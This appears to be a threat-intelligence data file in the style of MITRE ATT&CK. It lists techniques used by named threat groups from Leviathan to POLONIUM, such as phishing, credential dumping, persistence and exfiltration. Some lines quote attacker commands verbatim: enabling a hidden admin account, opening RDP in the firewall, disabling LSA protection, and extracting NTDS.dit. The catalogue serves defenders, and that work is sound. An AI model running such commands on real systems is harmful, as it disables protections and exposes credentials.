Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.
Leviathan has compromised email accounts to conduct social engineering attacks.
Leviathan has created new email accounts for targeting efforts.
Leviathan has obfuscated code using base64 and gzip compression.
Leviathan has exfiltrated data over its C2 channel.
Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.
Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.
Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access.
Leviathan has downloaded additional scripts and files from adversary-controlled servers.
Leviathan has conducted internal spearphishing within the victim's environment for lateral movement.
Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE.
Leviathan has used C:\Windows\Debug and C:\Perflogs as staging directories.
Leviathan has sent spearphishing attachments attempting to get a user to click.
Leviathan has sent spearphishing email links attempting to get a user to click.
Leviathan has used multi-hop proxies to disguise the source of their malicious traffic.
Leviathan has used publicly available tools to dump password hashes, including HOMEFRY.
Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.
Leviathan has used PowerShell for execution.
Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure.
Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.
Leviathan has used regsvr32 for execution.
Leviathan has staged data remotely prior to exfiltration.
Leviathan has targeted RDP credentials and used it to move through the victim environment.
Leviathan used ssh for internal reconnaissance.
Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.
Leviathan has compromised social media accounts to conduct social engineering attacks.
Leviathan has created new social media accounts for targeting efforts.
Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.
Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.
Leviathan has used steganography to hide stolen data inside other files stored on Github.
Leviathan has obtained valid accounts to gain initial access.
Leviathan has used VBScript.
Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems.
Leviathan has used WMI for execution.
Leviathan has used WMI for persistence.
LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website.
LuminousMoth has manually archived stolen files from victim machines before exfiltration.
LuminousMoth has signed their malware with a valid digital signature.
LuminousMoth has used legitimate executables such as `winword.exe` and `igfxem.exe` to side-load their malware.
LuminousMoth has split archived files into multiple parts to bypass a 5MB limit.
LuminousMoth has collected files and data from compromised machines.
LuminousMoth has used a valid digital certificate for some of their malware.
LuminousMoth has redirected compromised machines to an actor-controlled webpage through HTML injection.
LuminousMoth has used malware that exfiltrates stolen data to its C2 server.
LuminousMoth has exfiltrated data to Google Drive.
LuminousMoth has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives.
LuminousMoth has used malware to store malicious binaries in hidden directories on victim's USB drives.
LuminousMoth has downloaded additional malware and tools onto a compromised host.
LuminousMoth has created a link to a Dropbox file that has been used in their spear-phishing operations.
LuminousMoth has lured victims into clicking malicious Dropbox download links delivered through spearphishing.
LuminousMoth has used unique malware for information theft and exfiltration.
LuminousMoth has obtained and used malware such as Cobalt Strike.
LuminousMoth has disguised their exfiltration malware as `ZoomVideoApp.exe`.
LuminousMoth has used malware that adds Registry keys for persistence.
LuminousMoth has used malicious DLLs that setup persistence in the Registry Key `HKCU\Software\Microsoft\Windows\Current Version\Run`.
LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines.
LuminousMoth has created scheduled tasks to establish persistence for their tools.
LuminousMoth has sent spearphishing emails containing a malicious Dropbox download link.
LuminousMoth has used an unnamed post-exploitation tool to steal cookies from the Chrome browser.
LuminousMoth has used a malicious DLL to collect the username from compromised hosts.
LuminousMoth has obtained an ARP spoofing tool from GitHub.
LuminousMoth has hosted malicious payloads on Dropbox.
LuminousMoth has used HTTP for C2.
Machete has distributed Machete through a fake blog website.
Machete has relied on users opening malicious attachments delivered through spearphishing to execute malware.
Machete has has relied on users opening malicious links delivered through spearphishing to execute malware.
Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.
Machete has used msiexec to install the Machete malware.
Machete used multiple compiled Python scripts on the victim’s system. Machete's main backdoor Machete is also written in Python.
Machete has created scheduled tasks to maintain Machete's persistence.
Machete has delivered spearphishing emails that contain a zipped file with malicious contents.
Machete has sent phishing emails that contain a link to an external server with ZIP and RAR archives.
Machete has embedded malicious macros within spearphishing attachments to download additional files.
Machete has used batch files to initiate additional downloads of malicious files.
Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.
Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.
Magic Hound malware has used IRC for C2.
Magic Hound has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders.
Magic Hound malware can use a SOAP Web service to communicate with its C2 server.
Magic Hound has removed mailbox export requests from compromised Exchange servers.
Magic Hound has used base64-encoded commands.
Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites. Magic Hound has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel.
Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations.
Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.
Magic Hound enabled and used the default system managed account, DefaultAccount, via `"powershell.exe" /c net user DefaultAccount /active:yes` to connect to a targeted Exchange server over RDP.
Magic Hound has collected location information from visitors to their phishing sites.
Magic Hound has executed scripts to disable the event log service.
Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - `"netsh" advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389`.
Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads.
Magic Hound has used domain administrator accounts after dumping LSASS process memory.
Magic Hound has used a web shell to execute `nltest /trusted_domains` to identify trust relationships.
Magic Hound has registered fraudulent domains such as "mail-newyorker.com" and "news12.com.recover-session-service.site" to target specific victims with phishing attacks.
Magic Hound has used compromised domains to host links targeted to specific phishing victims.
Magic Hound has conducted watering-hole attacks through media and magazine websites.
Magic Hound has used Powershell to discover email accounts.
Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.
Magic Hound has established email accounts using fake personas for spearphishing operations.
Magic Hound has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting.
Magic Hound has compromised email credentials in order to steal sensitive data.
Magic Hound has used an encrypted http proxy in C2 communications.
Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES.
Magic Hound has used the Telegram API `sendMessage` to relay data on compromised devices.
Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via "ProxyShell" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379).
Magic Hound has deleted and overwrote files to cover tracks.
Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.
Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.
Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.
Magic Hound has captured the IP addresses of visitors to their phishing sites.
Magic Hound has disabled LSA protection on compromised hosts using `"reg" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f`.
Magic Hound has downloaded additional code and files from servers onto victims.
Magic Hound has conducted a network call out to a specific website as part of their initial discovery activity.
Magic Hound malware is capable of keylogging.
Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz.
Magic Hound has copied tools within a compromised network using RDP.
Magic Hound has created local accounts named `help` and `DefaultAccount` on compromised machines.
Magic Hound has collected .PST archives.
Magic Hound has attempted to lure victims into opening malicious email attachments.
Magic Hound has attempted to lure victims into opening malicious links embedded in emails.
Magic Hound has named a malicious script CacheTask.bat to mimic a legitimate task.
Magic Hound has used `dllhost.exe` to mask Fast Reverse Proxy (FRP) and `MicrosoftOutLookUpdater.exe` for Plink.
Magic Hound has modified Registry settings for security tools.
Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning.
Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.
Magic Hound has used PowerShell for execution and privilege escalation.
Magic Hound malware can list running processes.
Magic Hound has used Plink to tunnel RDP over SSH.
Magic Hound has used Fast Reverse Proxy (FRP) for RDP traffic.
Magic Hound malware has used Registry Run keys to establish persistence.
Magic Hound has used Remote Desktop Services to copy tools on targeted systems.
Magic Hound has exported emails from compromised Exchange servers including through use of the cmdlet `New-MailboxExportRequest.`
Magic Hound has used Ping for discovery on targeted networks.
Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.
Magic Hound has used scheduled tasks to establish persistence and execution.
Magic Hound malware can take a screenshot and upload the file to its C2 server.
Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.
Magic Hound has captured the user-agent strings from visitors to their phishing sites.
Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.
Magic Hound has used SMS and email messages with links designed to steal credentials or track victims.
Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.
Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.
Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.
Magic Hound has used quser.exe to identify existing RDP connections.
Magic Hound malware has obtained the victim username and sent it to the C2 server.
Magic Hound has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink.
Magic Hound malware has used VBS scripts for execution.
Magic Hound has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs.
Magic Hound has used HTTP for C2.
Magic Hound has acquired Amazon S3 buckets to use in C2.
Magic Hound has used multiple web shells to gain execution.
Magic Hound has collected names and passwords of all Wi-Fi networks to which a device has previously connected.
Magic Hound has used the command-line interface for code execution.
Magic Hound has used a tool to run `cmd /c wmic computersystem get domain` for discovery.
Malteiro has obtained credentials from mail clients via NirSoft MailPassView.
Malteiro has stolen credentials stored in the victim’s browsers via software tool NirSoft WebBrowserPassView.
Malteiro has the ability to deobfuscate downloaded files prior to execution.
Malteiro has injected Mispadu’s DLL into a process.
Malteiro has used scripts encoded in Base64 certificates to distribute malware to victims.
Malteiro targets organizations in a wide variety of sectors via the use of Mispadu banking trojan with the goal of financial theft.
Malteiro has relied on users to execute .zip file attachments containing malicious URLs.
Malteiro collects the installed antivirus on the victim machine.
Malteiro has sent spearphishing emails containing malicious .zip files.
Malteiro collects the machine information, system architecture, the OS version, computer name, and Windows product name.
Malteiro will terminate Mispadu's infection process if the language of the victim machine is not Spanish or Portuguese.
Malteiro has utilized a dropper containing malicious VBS scripts.
Metador has encrypted their payloads.
Metador has quickly deleted `cbd.exe` from a compromised host following the successful deployment of their malware.
Metador has downloaded tools and malware onto a compromised system.
Metador has used unique malware in their operations, including metaMain and Mafalda.
Metador has used TCP for C2.
Metador has used Microsoft's Console Debugger in some of their operations.
Metador has used HTTP for C2.
Metador has used the Windows command line to execute commands.
Metador has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as `cdb.exe`.
Moafee has been known to employ binary padding.
Mofang has compressed the ShimRat executable within malicious email attachments. Mofang has also encrypted payloads before they are downloaded to victims.
Mofang's malicious spearphishing attachments required a user to open the file after receiving.
Mofang's spearphishing emails required a user to click the link to connect to a compromised website.
Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.
Mofang delivered spearphishing emails with malicious links included.
Molerats has used forged Microsoft code-signing certificates on malware.
Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.
Molerats decompresses ZIP files once on the victim machine.
Molerats has delivered compressed executables within ZIP files to victims.
Molerats used executables to download malicious files from different sources.
Molerats used various implants, including those built with JS, on target machines.
Molerats has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.
Molerats has sent malicious links via email trick users into opening a RAR archive and running an executable.
Molerats has used msiexec.exe to execute an MSI payload.
Molerats used PowerShell implants on target machines.
Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.
Molerats saved malicious files within the AppData and Startup folders to maintain persistence.
Molerats has created scheduled tasks to persistently run VBScripts.
Molerats has sent phishing emails with malicious Microsoft Word and PDF attachments.
Molerats has sent phishing emails with malicious links included.
Molerats used various implants, including those built with VBScript, on target machines.
Moses Staff has used signed drivers from an open source tool called DiskCryptor to evade detection.
Moses Staff has used batch scripts that can disable the Windows firewall on specific remote machines.
Moses Staff has used obfuscated web shells in their operations.
Moses Staff has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.
Moses Staff has downloaded and installed web shells to following path &lt;code&gt;C:\inetpub\wwwroot\aspnet_client\system_web\IISpool.aspx&lt;/code&gt;.
Moses Staff has collected the administrator username from a compromised host.
Moses Staff has built malware, such as DCSrv and PyDCrypt, for targeting victims' machines.
Moses Staff has used batch scripts that can enable SMB on a compromised host.
Moses Staff collected information about the infected host, including the machine names and OS architecture.
Moses Staff has collected the domain name of a compromised network.
Moses Staff has used the commercial tool DiskCryptor.
Moses Staff has dropped a web shell onto a compromised system.
MoustachedBouncer has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.
MoustachedBouncer has exploited CVE-2021-1732 to execute malware components with elevated rights.
MoustachedBouncer has used JavaScript to deliver malware hosted on HTML pages.
MoustachedBouncer has used plugins to execute PowerShell scripts.
MoustachedBouncer has used a reverse proxy tool similar to the GitHub repository revsocks.
MoustachedBouncer has used plugins to save captured screenshots to `.\AActdata\` on an SMB share.
MoustachedBouncer has used plugins to take screenshots on targeted systems.
MoustachedBouncer has used malware plugins packed with Themida.
MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.
MuddyWater has used web services including OneHub to distribute remote access tools.
MuddyWater uses various techniques to bypass UAC.
MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.
MuddyWater has performed credential dumping with LaZagne.
MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.
MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.
MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.
MuddyWater has run a tool that steals passwords saved in victim email.
MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.
MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers.
MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.
MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript.
MuddyWater can disable the system's local proxy settings.
MuddyWater has used &lt;code&gt;cmd.exe net user /domain&lt;/code&gt; to enumerate domain users.
MuddyWater has used malware that can execute PowerShell scripts via DDE.
MuddyWater has used C2 infrastructure to receive exfiltrated data.
MuddyWater has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).
MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.
MuddyWater has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).
MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).
MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords "Kasper," "Panda," or "ESET."
MuddyWater has used malware that can upload additional files to the victim’s machine.
MuddyWater has used JavaScript files to execute its POWERSTATS payload.
MuddyWater has performed credential dumping with LaZagne.
MuddyWater has performed credential dumping with Mimikatz and procdump64.exe.
MuddyWater has stored a decoy PDF file within a victim's `%temp%` folder.
MuddyWater has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.
MuddyWater has distributed URLs in phishing e-mails that link to lure documents.
MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.
MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.
MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.
MuddyWater has used a Word Template, Normal.dotm, for persistence.
MuddyWater has used PowerShell for execution.
MuddyWater has used malware to obtain a list of running processes on the system.
MuddyWater has developed tools in Python including Out1.
MuddyWater has added Registry Run key &lt;code&gt;KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding&lt;/code&gt; to establish persistence.
MuddyWater has used legitimate applications ScreenConnect and AteraAgent to manage systems remotely and move laterally.
MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.
MuddyWater has used scheduled tasks to establish persistence.
MuddyWater has used malware that can capture screenshots of the victim’s machine.
MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.
MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.
MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.
MuddyWater has sent targeted spearphishing e-mails with malicious links.
MuddyWater has used tools to encode C2 communications including Base64 encoding.
MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.
MuddyWater has used AES to encrypt C2 responses.
MuddyWater has used malware that can collect the victim’s OS version and machine name.
MuddyWater has used malware to collect the victim’s IP address and domain name.
MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.
MuddyWater has used malware that can collect the victim’s username.
MuddyWater has made use of legitimate tools ConnectWise and Remote Utilities to gain access to target environment.
MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros.
MuddyWater has used HTTP for C2 communications.
MuddyWater has used file sharing services including OneHub, Sync, and TeraBox to distribute tools.
MuddyWater has used a custom tool for creating reverse shells.
MuddyWater has used malware that leveraged WMI for execution and querying host information.
Mustang Panda has encrypted documents with RC4 prior to exfiltration.
Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration.
Mustang Panda used custom batch scripts to collect files automatically from a targeted system.
Mustang Panda has used junk code within their DLL files to hinder analysis.
Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file.
Mustang Panda have acquired C2 domains prior to operations.
Mustang Panda has used an additional filename extension to hide the true file type.
Mustang Panda has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.
Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.
Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code.
Mustang Panda will delete their tools and files, and kill processes after their objectives are reached.
Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.
Mustang Panda's PlugX variant has created a hidden folder on USB drives named &lt;code&gt;RECYCLE.BIN&lt;/code&gt; to store malicious executables and collected data.
Mustang Panda has downloaded additional executables following the initial infection stage.
Mustang Panda has used &lt;code&gt;InstallUtil.exe&lt;/code&gt; to execute a malicious Beacon stager.
Mustang Panda has stored collected credential files in &lt;code&gt;c:\windows\temp&lt;/code&gt; prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives.
Mustang Panda has sent malicious files requiring direct victim interaction to execute.
Mustang Panda has sent malicious links including links directing victims to a Google Drive folder.
Mustang Panda has used names like `adobeupdate.dat` and `PotPlayerDB.dat` to disguise PlugX, and a file named `OneDrive.exe` to load a Cobalt Strike payload.
Mustang Panda has used mshta.exe to launch collection scripts.
Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used &lt;code&gt;reg save&lt;/code&gt; on the SYSTEM file Registry location to help extract the NTDS.dit file.
Mustang Panda has delivered initial payloads hidden using archives and encoding measures.
Mustang Panda has used malicious PowerShell scripts to enable execution.
Mustang Panda has used &lt;code&gt;tasklist /v&lt;/code&gt; to determine active process information.
Mustang Panda has created the registry key &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU&lt;/code&gt; to maintain persistence.
Mustang Panda has installed TeamViewer on targeted systems.
Mustang Panda has used a customized PlugX variant which could spread through USB connections.
Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence.
Mustang Panda has searched the victim system for the &lt;code&gt;InstallUtil.exe&lt;/code&gt; program and its version.
Mustang Panda has used spearphishing attachments to deliver initial access payloads.
Mustang Panda has delivered malicious links to their intended targets.
Mustang Panda has delivered web bugs to profile their intended targets.
Mustang Panda has used servers under their control to validate tracking pixels sent to phishing victims.
Mustang Panda has encrypted C2 communications with RC4.
Mustang Panda has gathered system information using &lt;code&gt;systeminfo&lt;/code&gt;.
Mustang Panda has used &lt;code&gt;ipconfig&lt;/code&gt; and &lt;code&gt;arp&lt;/code&gt; to determine network configuration information.
Mustang Panda has used &lt;code&gt;netstat -ano&lt;/code&gt; to determine network connection information.
Mustang Panda has hosted malicious payloads on DropBox including PlugX.
Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection.
Mustang Panda has communicated with its C2 via HTTP POST requests.
Mustang Panda has used DropBox URLs to deliver variants of PlugX.
Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection.
Mustang Panda has executed PowerShell scripts via WMI.
Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence.
Mustard Tempest operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page.
Mustard Tempest has used drive-by downloads for initial infection, often using fake browser updates as a lure.
Mustard Tempest has injected malicious JavaScript into compromised websites to infect victims via drive-by download.
Mustard Tempest has deployed secondary payloads and third stage implants to compromised hosts.
Mustard Tempest has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.
Mustard Tempest has posted false advertisements including for software packages and browser updates in order to distribute malware.
Mustard Tempest has used the filename `AutoUpdater.js` to mimic legitimate update files and has also used the Cyrillic homoglyph characters С `(0xd0a1)` and а `(0xd0b0)`, to produce the filename `Сhrome.Updаte.zip`.
Mustard Tempest has poisoned search engine results to return fake software updates in order to distribute malware.
Mustard Tempest has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months.
Mustard Tempest has sent victims emails containing links to compromised websites.
Mustard Tempest has used implants to perform system reconnaissance on targeted systems.
Mustard Tempest has hosted payloads on acquired second-stage servers for periods of either days, weeks, or months.
Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host.
Naikon has used DLL side-loading to load malicious DLL's into legitimate executables.
Naikon has used administrator credentials for lateral movement in compromised networks.
Naikon has convinced victims to open malicious attachments to execute malware.
Naikon renamed a malicious service &lt;code&gt;taskmgr&lt;/code&gt; to appear to be a legitimate version of Task Manager.
Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables.
Naikon has used the LadonGo scanner to scan target networks.
Naikon has modified a victim's Windows Run registry to establish persistence.
Naikon has used a netbios scanner for remote machine identification.
Naikon has used schtasks.exe for lateral movement in compromised networks.
Naikon uses commands such as &lt;code&gt;netsh advfirewall firewall&lt;/code&gt; to discover local firewall settings.
Naikon has used malicious e-mail attachments to deliver malware.
Naikon uses commands such as &lt;code&gt;netsh interface show&lt;/code&gt; to discover network interface settings.
Naikon has used WMIC.exe for lateral movement.
Nomadic Octopus executed PowerShell in a hidden window.
Nomadic Octopus has used malicious macros to download additional files to the victim's machine.
Nomadic Octopus as attempted to lure victims into clicking on malicious attachments within spearphishing emails.
Nomadic Octopus attempted to make Octopus appear as a  Telegram Messenger with a Russian interface.
Nomadic Octopus has used PowerShell for execution.
Nomadic Octopus has targeted victims with spearphishing emails containing malicious attachments.
Nomadic Octopus used &lt;code&gt;cmd.exe /c&lt;/code&gt; within a malicious macro.
OilRig used the Plink utility and other tools to create tunnels to C2 servers.
OilRig has used automated collection.
OilRig has used brute force techniques to obtain credentials.
OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.
OilRig has used various types of scripting for execution.
OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.
OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.
OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.
OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers.
OilRig has used DNS for C2 including the publicly available &lt;code&gt;requestbin.net&lt;/code&gt; tunneling service.
A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.
OilRig has run &lt;code&gt;net user&lt;/code&gt;, &lt;code&gt;net user /domain&lt;/code&gt;, &lt;code&gt;net group “domain admins” /domain&lt;/code&gt;, and &lt;code&gt;net group “Exchange Trusted Subsystem” /domain&lt;/code&gt; to get account listings on a victim.
OilRig has used &lt;code&gt;net group /domain&lt;/code&gt;, &lt;code&gt;net group “domain admins” /domain&lt;/code&gt;, and &lt;code&gt;net group “Exchange Trusted Subsystem” /domain&lt;/code&gt; to find domain group permission settings.
OilRig has encrypted and encoded data in its malware, including by using base64.
OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS.
OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.
OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.
OilRig has deleted files associated with their payload after execution.
OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.
OilRig can download remote files onto victims.
OilRig has used keylogging tools called KEYPUNCH and LONGWATCH.
OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.
OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access.
OilRig has run &lt;code&gt;net user&lt;/code&gt;, &lt;code&gt;net user /domain&lt;/code&gt;, &lt;code&gt;net group “domain admins” /domain&lt;/code&gt;, and &lt;code&gt;net group “Exchange Trusted Subsystem” /domain&lt;/code&gt; to get account listings on a victim.
OilRig has used &lt;code&gt;net localgroup administrators&lt;/code&gt; to find local administrators on compromised systems.
OilRig has delivered macro-enabled documents that required targets to click the "enable content" button to execute the payload on the system.
OilRig has delivered malicious links to achieve execution on the target system.
OilRig has used .doc file extensions to mask malicious executables.
OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.
OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.
OilRig has used net.exe in a script with &lt;code&gt;net accounts /domain&lt;/code&gt; to find the password policy of a domain.
OilRig has used tools to identify if a mouse is connected to a targeted system.
OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.
OilRig has run &lt;code&gt;tasklist&lt;/code&gt; on a victim's machine.
OilRig has used the Plink utility and other tools to create tunnels to C2 servers.
OilRig has used &lt;code&gt;reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default”&lt;/code&gt; on a victim to query the Registry.
OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.
OilRig has used Putty to access compromised systems.
OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.
OilRig has a tool called CANDYKING to capture a screenshot of user's desktop.
OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.
OilRig has sent spearphising emails with malicious links to potential victims.
OilRig has used LinkedIn to send spearphishing links.
OilRig has used macros to verify if a mouse is connected to a compromised machine.
OilRig has run &lt;code&gt;hostname&lt;/code&gt; and &lt;code&gt;systeminfo&lt;/code&gt; on a victim.
OilRig has run &lt;code&gt;ipconfig /all&lt;/code&gt; on a victim.
OilRig has used &lt;code&gt;netstat -an&lt;/code&gt; on a victim to get a listing of network connections.
OilRig has run &lt;code&gt;whoami&lt;/code&gt; on a victim.
OilRig has used &lt;code&gt;sc query&lt;/code&gt; on a victim to gather information about services.
OilRig has used compromised credentials to access other systems on a victim network.
OilRig has used VBScript macros for execution on compromised hosts.
OilRig has used HTTP for C2.
OilRig has used web shells, often to maintain access to a victim network.
OilRig has used macros to deliver malware such as QUADAGENT and OopsIE. OilRig has used batch scripts.
OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.
OilRig has used WMI for execution.
Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.
Orangeworm has used HTTP for C2.
PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access.
PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins.
PLATINUM has leveraged a zero-day vulnerability to escalate privileges.
PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.
PLATINUM has used several different keyloggers.
PLATINUM has used keyloggers that are also capable of dumping credentials.
PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.
PLATINUM has renamed rar.exe to avoid detection.
PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.
PLATINUM has used various methods of process injection including hot patching.
PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector.
POLONIUM has used OneDrive and DropBox for C2.
POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts.
POLONIUM has used the AirVPN service for operational activity.
POLONIUM has obtained and used tools such as AirVPN and plink in their operations.
POLONIUM has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.
POLONIUM has used valid compromised credentials to gain access to victim environments.
